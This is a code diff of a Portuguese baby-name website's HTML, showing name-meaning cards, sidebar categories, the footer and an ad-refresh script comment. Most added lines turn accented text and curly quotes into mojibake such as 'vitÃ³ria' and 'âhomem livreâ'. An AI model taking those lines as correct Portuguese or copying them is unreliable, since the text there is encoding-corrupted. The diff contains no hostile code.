+                                            <span class="list-wide--desc full-w"> Significa âaquele que doutrinaâ, âconselheiroâ; âaquele que vem do calcanharâ.
 
-Um nome masculino histórico e cheio de personalidade, Diego tem...</span>
+Um nome masculino histÃ³rico e cheio de personalidade, Diego tem...</span>
                                         </a>
                                     </li>
 
@@ -651,7 +651,7 @@ Um nome masculino histórico e cheio de personalidade, Diego tem...</span>
                                     <li>
                                         <a href="/alexandre/" class="full-w">
                                             <span class="list-wide--name full-w">Alexandre</span>
-                                            <span class="list-wide--desc full-w"> Significa "defensor da humanidade", "protetor do homem", “o que repele os inimigos”.
+                                            <span class="list-wide--desc full-w"> Significa "defensor da humanidade", "protetor do homem", âo que repele os inimigosâ.
 
 Elegante e imponente, o nome masculino Alexandre apresenta...</span>
                                         </a>
@@ -667,9 +667,9 @@ Elegante e imponente, o nome masculino Alexandre apresenta...</span>
                                     <li>
                                         <a href="/carlos/" class="full-w">
                                             <span class="list-wide--name full-w">Carlos</span>
-                                            <span class="list-wide--desc full-w"> Significa "homem", “homem do povo”, “homem livre”, "guerreiro".
+                                            <span class="list-wide--desc full-w"> Significa "homem", âhomem do povoâ, âhomem livreâ, "guerreiro".
 
-O popular nome masculino Carlos tem origem no germânico Karl, a partir dos termos...</span>
+O popular nome masculino Carlos tem origem no germÃ¢nico Karl, a partir dos termos...</span>
                                         </a>
                                     </li>
 
@@ -679,7 +679,7 @@ O popular nome masculino Carlos tem origem no germânico Karl, a partir dos term
                                             <span class="list-wide--name full-w">Vitor</span>
                                             <span class="list-wide--desc full-w"> Significa "vencedor", "vitorioso" ou "conquistador".
 
-O nome masculino Vitor carrega fortes significados atrelados à vitória e à conquista. Este nome surgiu...</span>
+O nome masculino Vitor carrega fortes significados atrelados Ã  vitÃ³ria e Ã  conquista. Este nome surgiu...</span>
                                         </a>
                                     </li>
 
@@ -689,7 +689,7 @@ O nome masculino Vitor carrega fortes significados atrelados à vitória e à co
                                             <span class="list-wide--name full-w">Caio</span>
                                             <span class="list-wide--desc full-w"> Significa "alegre", "contente" ou "feliz".
 
-Curto e repleto de significados brilhantes, o nome masculino Caio se tornou um dos preferidos em nosso país para...</span>
+Curto e repleto de significados brilhantes, o nome masculino Caio se tornou um dos preferidos em nosso paÃ­s para...</span>
                                         </a>
                                     </li>
 
@@ -697,7 +697,7 @@ Curto e repleto de significados brilhantes, o nome masculino Caio se tornou um d
                                     <li>
                                         <a href="/marcos/" class="full-w">
                                             <span class="list-wide--name full-w">Marcos</span>
-                                            <span class="list-wide--desc full-w"> Significa “guerreiro”, “dedicado à Marte”.
+                                            <span class="list-wide--desc full-w"> Significa âguerreiroâ, âdedicado Ã  Marteâ.
 
 O popular nome masculino Marcos tem origem na palavra em latim marcus. Esta palavra deriva de Mars, que...</span>
                                         </a>
@@ -709,7 +709,7 @@ O popular nome masculino Marcos tem origem na palavra em latim marcus. Esta pala
                                             <span class="list-wide--name full-w">Pietro</span>
                                             <span class="list-wide--desc full-w"> Significa: "pedra", "rochedo" ou "firme".
 
-O bonito e forte nome Pietro é a versão italiana do nome de origem grega Pedro. Estes dois nomes surgiram a partir...</span>
+O bonito e forte nome Pietro Ã© a versÃ£o italiana do nome de origem grega Pedro. Estes dois nomes surgiram a partir...</span>
                                         </a>
                                     </li>
 
@@ -719,7 +719,7 @@ O bonito e forte nome Pietro é a versão italiana do nome de origem grega Pedro
                                             <span class="list-wide--name full-w">Victor</span>
                                             <span class="list-wide--desc full-w"> Significa "vencedor", "vitorioso", "conquistador".
 
-O nome masculino Victor carrega fortes significados atrelados à vitória e à conquista. Ele é um nome que...</span>
+O nome masculino Victor carrega fortes significados atrelados Ã  vitÃ³ria e Ã  conquista. Ele Ã© um nome que...</span>
                                         </a>
                                     </li>
 
@@ -727,9 +727,9 @@ O nome masculino Victor carrega fortes significados atrelados à vitória e à c
                                     <li>
                                         <a href="/bryan/" class="full-w">
                                             <span class="list-wide--name full-w">Bryan</span>
-                                            <span class="list-wide--desc full-w"> Significa "nobre", "forte", "virtuoso", “honroso”, “exaltado”.
+                                            <span class="list-wide--desc full-w"> Significa "nobre", "forte", "virtuoso", âhonrosoâ, âexaltadoâ.
 
-Força, nobreza, virtude e liderança são as principais ideias transmitidas através...</span>
+ForÃ§a, nobreza, virtude e lideranÃ§a sÃ£o as principais ideias transmitidas atravÃ©s...</span>
                                         </a>
                                     </li>
 
@@ -737,9 +737,9 @@ Força, nobreza, virtude e liderança são as principais ideias transmitidas atr
                                     <li>
                                         <a href="/francisco/" class="full-w">
                                             <span class="list-wide--name full-w">Francisco</span>
-                                            <span class="list-wide--desc full-w"> Significa "francês livre", "aquele que vem da França", “homem livre”.
+                                            <span class="list-wide--desc full-w"> Significa "francÃªs livre", "aquele que vem da FranÃ§a", âhomem livreâ.
 
-O belo e imponente nome Francisco é um dos nomes masculinos mais populares em...</span>
+O belo e imponente nome Francisco Ã© um dos nomes masculinos mais populares em...</span>
                                         </a>
                                     </li>
 
@@ -747,7 +747,7 @@ O belo e imponente nome Francisco é um dos nomes masculinos mais populares em..
                                     <li>
                                         <a href="/ricardo/" class="full-w">
                                             <span class="list-wide--name full-w">Ricardo</span>
-                                            <span class="list-wide--desc full-w"> Significa “rei forte”, “líder corajoso”, “príncipe forte” ou “príncipe corajoso”.
+                                            <span class="list-wide--desc full-w"> Significa ârei forteâ, âlÃ­der corajosoâ, âprÃ­ncipe forteâ ou âprÃ­ncipe corajosoâ.
 
 O bonito e imponente nome masculino Ricardo tem origem a...</span>
                                         </a>
@@ -902,7 +902,7 @@ Forte, imponente e repleto de significados grandiosos, o nome Fernando tem...</s
 
                 <div class="sidebar-bottom">
                             <div class="list-mod-wrap mt-30 mb-30">
-            <h2 class="list-mod--title">Últimas Atualizações</h2>
+            <h2 class="list-mod--title">Ãltimas AtualizaÃ§Ãµes</h2>
             <ul class="list-mod--list col-2 list-mod--list-border list-latest t-center">
                                             <li>
                             <a href="/miguel/"><span>Miguel</span></a>
@@ -923,7 +923,7 @@ Forte, imponente e repleto de significados grandiosos, o nome Fernando tem...</s
                             <a href="/pedro-lucas/"><span>Pedro Lucas</span></a>
                         </li>
                                             <li>
-                            <a href="/joao-lucas/"><span>João Lucas</span></a>
+                            <a href="/joao-lucas/"><span>JoÃ£o Lucas</span></a>
                         </li>
                                             <li>
                             <a href="/johnny/"><span>Johnny</span></a>
@@ -940,7 +940,7 @@ Forte, imponente e repleto de significados grandiosos, o nome Fernando tem...</s
                 <div class="list-mod--title">Categorias em destaque</div>
                 <ul class="list-mod--list col-2 list-mod--list-border t-center">
                                             <li>
-                            <a href="/nomes-biblicos/"><span>Nomes Bíblicos</span></a>
+                            <a href="/nomes-biblicos/"><span>Nomes BÃ­blicos</span></a>
                         </li>
                                             <li>
                             <a href="/nomes-italianos/"><span>Nomes Italianos</span></a>
@@ -961,13 +961,13 @@ Forte, imponente e repleto de significados grandiosos, o nome Fernando tem...</s
                             <a href="/nomes-franceses/"><span>Nomes Franceses</span></a>
                         </li>
                                             <li>
-                            <a href="/nomes-indigenas/"><span>Nomes Indígenas</span></a>
+                            <a href="/nomes-indigenas/"><span>Nomes IndÃ­genas</span></a>
                         </li>
                                             <li>
-                            <a href="/nomes-arabes/"><span>Nomes Árabes</span></a>
+                            <a href="/nomes-arabes/"><span>Nomes Ãrabes</span></a>
                         </li>
                                             <li>
-                            <a href="/nomes-mitologicos/"><span>Nomes Mitológicos</span></a>
+                            <a href="/nomes-mitologicos/"><span>Nomes MitolÃ³gicos</span></a>
                         </li>
                                         <li class="full-w see-all"><a href="/categorias/"><span>Todas as Categorias</span></a></li>
                 </ul>
@@ -998,13 +998,13 @@ Forte, imponente e repleto de significados grandiosos, o nome Fernando tem...</s
         <div class="row">
             <div class="col-xs-12">
                 <ul id="footer-list" class="footer-list footer-list--highlight">
-                    <li><a href="/ultimos-nomes/">Últimos Nomes</a></li>
+                    <li><a href="/ultimos-nomes/">Ãltimos Nomes</a></li>
                     <li><a href="/nomes-pelo-mundo/">Nomes pelo Mundo</a></li>
-                    <li><a href="../bebes/">Nomes de Bebês</a></li>
+                    <li><a href="../bebes/">Nomes de BebÃªs</a></li>
                 </ul>
                 <ul class="footer-list footer-list--org">
-                    <li><a href="/sobre/">Sobre Nós</a></li>
-                    <li><a href="/politica-privacidade/">Política de Privacidade</a></li>
+                    <li><a href="/sobre/">Sobre NÃ³s</a></li>
+                    <li><a href="/politica-privacidade/">PolÃ­tica de Privacidade</a></li>
                     <li><a href="https://www.7graus.com/MediaKit-PT-BR.pdf" rel="nofollow" target="_blank">Anuncie</a></li>
                     <li><a href="/termos-uso/">Termos de Uso</a></li>
                     <li><a href="/contato/">Contato</a></li>
@@ -1013,9 +1013,9 @@ Forte, imponente e repleto de significados grandiosos, o nome Fernando tem...</s
                 <div class="copyright">
                     <span class="info">Significado dos Nomes</span>
                     <span class="separator"> - </span>
-                    <span class="info">Dicionário de Nomes Próprios</span>
+                    <span class="info">DicionÃ¡rio de Nomes PrÃ³prios</span>
                     <br>
-                    <span>� 2008 - 2026 <a href="https://www.7graus.com/" rel="co-worker nofollow">7Graus</a>.</span>
+                    <span>© 2008 - 2026 <a href="https://www.7graus.com/" rel="co-worker nofollow">7Graus</a>.</span>
                 </div>
             </div>
         </div>
@@ -1184,9 +1184,9 @@ Forte, imponente e repleto de significados grandiosos, o nome Fernando tem...</s
                     return;
                 }
                 
-                // Verificar se o retryTime está definido e é um número válido
+                // Verificar se o retryTime estÃ¡ definido e Ã© um nÃºmero vÃ¡lido
                 if (typeof slot.sgRefreshRetryTime !== "number" || isNaN(slot.sgRefreshRetryTime)) {
-                    console.warn(`Retry time não configurado corretamente para o slot: ${slot.getAdUnitPath()}`);
+                    console.warn(`Retry time nÃ£o configurado corretamente para o slot: ${slot.getAdUnitPath()}`);
                     return;
                 }
                 debugScript(sgIntervalRefreshAds.debug,`intervalRefreshAd slotRenderEnded slot: isEmpty: ${event.isEmpty} | ${slot.getAdUnitPath()}`, slot);
